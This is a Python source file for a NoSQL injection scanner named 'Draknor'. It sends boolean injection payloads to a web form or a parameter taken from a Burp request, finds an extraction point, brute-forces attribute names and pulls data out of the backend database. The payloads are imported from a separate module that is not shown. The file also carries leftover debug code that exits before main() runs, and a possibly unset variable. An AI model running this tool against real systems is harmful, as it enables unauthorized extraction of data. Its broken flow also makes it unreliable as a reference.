import traceback
import argparse
from payloads import *
from utils import *
import re
from burputils import *

# BUG JSON wird nicht richtig versendet
# POST /index.php HTTP/1.1
# ...
# trackingNum=%24regex

#TODO
# implement custom fail string implementation
# implement array payload handling
# implement time based payload handling


def scan_array_payloads():
    #if payload.startswith("%5b"): # %5b = [
        #       r_data = remove_char_at_index(r_data, r_data.index(f"§{index}§")-1)
        #      r_data = r_data.replace(f"§{index}§", payload)
    pass

def scan_bool_payloads(attack_target, baseline_response,debug=False): 
    print(f"[*] Starting bool payload scanning with {len(bool_payloads)} payloads...")   
    success_payloads=[]
    error_payloads=[]

    for payload, extraction_payload in bool_payloads:        
        #send request
        response = send_post_request(attack_target, payload,debug=debug)

        #is request error
        if response.status_code != baseline_response.status_code:
            print(f"\t[?] Unexpected Status Code: {response.status_code} {payload}")       
            error_payloads.append(payload)
        # is request success
        elif len(response.text) != len(baseline_response.text):            
            print(f"\t[+] SUCCESS:{payload}")       
            success_payloads.append([payload, extraction_payload])     

    return success_payloads, error_payloads


def verify_extraction_point(success_payloads, attack_target):
    print("[+] Verifing SSJI extraction point...")
    for _, extraction_payload in success_payloads:         
        print(f"[*] Testing extraction payload: {extraction_payload}")
        if send_extraction_request(attack_target, extraction_payload, "true"):                 
            if not send_extraction_request(attack_target, extraction_payload, "false"):         
                extraction_point = extraction_payload
                break

    if not extraction_point:
        print("[-] No valid extraction point found")
        exit()
    else: 
        print(f"[+] Valid extraction point found: {extraction_point}")
        return extraction_point

def create_form_data_obj(direct_url, form_extract_target, burp_file_path, scan_param_name, post_data):
    # extract post data from html form    
    if form_extract_target:        
        if not scan_param_name: # TODO auto test all params            
            raise Exception("[-] Target parameter (-p) or §parameter_name§ placeholder has to be set")                
        return extract_form_data(form_extract_target,scan_param_name)
    elif direct_url:         
        print("[*] Checking supplied form data...")      
        parsed_url = urlparse(direct_url)                
        attack_target = AttackTarget(
            url=f"{parsed_url.scheme}://{parsed_url.netloc}",
            action=parsed_url.path
        )
        attack_target.method= "GET" if "?" in attack_target.action else "POST"
        if post_data:
            attack_target.parameters=post_data
        elif attack_target.method=="GET":
            attack_target.parameters=attack_target.action.split("?")[1]
    elif burp_file_path:
        return create_attack_target_from_burp_data(burp_file_path)
    else:        
        raise Exception("Choose either -e (extract form from URL) or -u (target URL) to select your target")
    
def init():
    parser = argparse.ArgumentParser(description="Simple NoSQL Enumeration Tool")
    parser.add_argument('-u', '--url', help="Scan Url to scan")
    parser.add_argument('-b', '--burp', help="Burp request file to extract target from")
    parser.add_argument('-e', '--extract', help="Scan Target to extract form from")
    parser.add_argument('-p', '--parameter', help="Parameter to test")
    parser.add_argument('-f', '--fail_string', help="Response string for failed requests")
    parser.add_argument('-d', '--data', help="Post Data")
    parser.add_argument('-v','--verbose', action='store_true', help="Show verbose debug")
    #parser.add_argument('--arrays', action='store_true', help="Activate array payloads")
    #parser.add_argument('--time', action='store_true', help="Activate time payload")

    
    args = parser.parse_args()

    # init arg params
    scan_param_name=args.parameter
    direct_url= check_and_correct_url_schema(args.url)
    form_extract_target=check_and_correct_url_schema(args.extract)
    burp_file_path=args.burp
    post_data=args.data
    verbose=args.verbose
    fail_message=args.fail_string
    

    if not form_extract_target and not direct_url and not burp_file_path:
        parser.print_help()
        raise Exception("[-] Target url(-u) or target(-t) has to be set")                

    try:
        attack_target = create_form_data_obj(direct_url, form_extract_target,burp_file_path, scan_param_name, post_data)
    except Exception as e:
        parser.print_help()
        raise e
    
    if not attack_target.parameters or not attack_target.http_verb or not attack_target.path:
        parser.print_help()
        raise Exception("Incomplete attack_target object for request: Check input parameters")
    
    
    if not scan_param_name and f"§" not in attack_target.parameters:
        parser.print_help()
        raise Exception("[-] Target parameter (-p) or §parameter_name§ placeholder has to be set")                
    
    if scan_param_name and f"§{scan_param_name}§" not in attack_target.parameters:
        print(f"[*] Auto inserting placeholder in parameter {scan_param_name}...")
        attack_target.parameters = replace_param_value(attack_target.parameters, attack_target.request_body_type, scan_param_name)

    if not scan_param_name:
        print(f"[*] Auto extracting target parameter from supplied data {attack_target.parameters}...")
        pattern = r'=(§(.*?)§)'

        # Search for the pattern in the provided string
        match = re.search(pattern, attack_target.parameters)
    
        if match:
            scan_param_name = match.group(2)  
        else:
            raise Exception("Could not extract target parameter from parameter data. Format is name=§value§")
    attack_target.scan_param_name = scan_param_name
    return attack_target,verbose


def main():
    print("--- Starting Draknor NoSQL Injection Scanner ---")

    attack_target, debug = init()    

    print("[+] Attack target:", attack_target.http_verb,attack_target.get_target_url())
    print("[+] Parameters:", attack_target.parameters)
    print("[*] Checking if form target page is reflective...")

    baseline_response = get_baseline_response(attack_target,debug=debug)
    attack_target.set_baseline_response(baseline_response)
    print(f"[+] Set baseline response length to: {len(baseline_response.text)}")
    
    # Start Scanning
    success_payloads, error_payloads = scan_bool_payloads(attack_target, baseline_response,debug=debug)

    if error_payloads:
        print("Error inflicting payloads:")
        for p in error_payloads:
            print(f"\t {p}")
        
    if success_payloads:      
        print("Successfull payloads:")
        for p in success_payloads:
            print(f"\t {p[0]}")
        
        # verify extraction point    
        extraction_point = verify_extraction_point(success_payloads, attack_target)

        # enumerate attribute names
        found_attributes = brute_attribute_names(attack_target, extraction_point)

        # extract data
        results = []
        for attr, length in found_attributes:
            res = brute_extract_data(attack_target, baseline_response, extraction_point, attr, length)
            if res:
                print(f"[data] {attr}:{res}")   
                results.append([attr, res])
            
        # print results
        print_results(found_attributes, results)

    #if args.arrays:  
    #    scan_array_payloads()
    
    else:        
        print("[-] No successfull payloads found")


t = create_attack_target_from_burp_data("draknor_input_json_succ.req")
print(t)
print(t.parameters["trackingNum"])
send_post_request(t,t.parameters["trackingNum"], debug=True)
exit()


try:
    main()
except KeyboardInterrupt:
    print("\nCTRL+C detected! Draknor shuting down...")
except Exception as e:
    traceback.print_exc()   
    print("\n") 



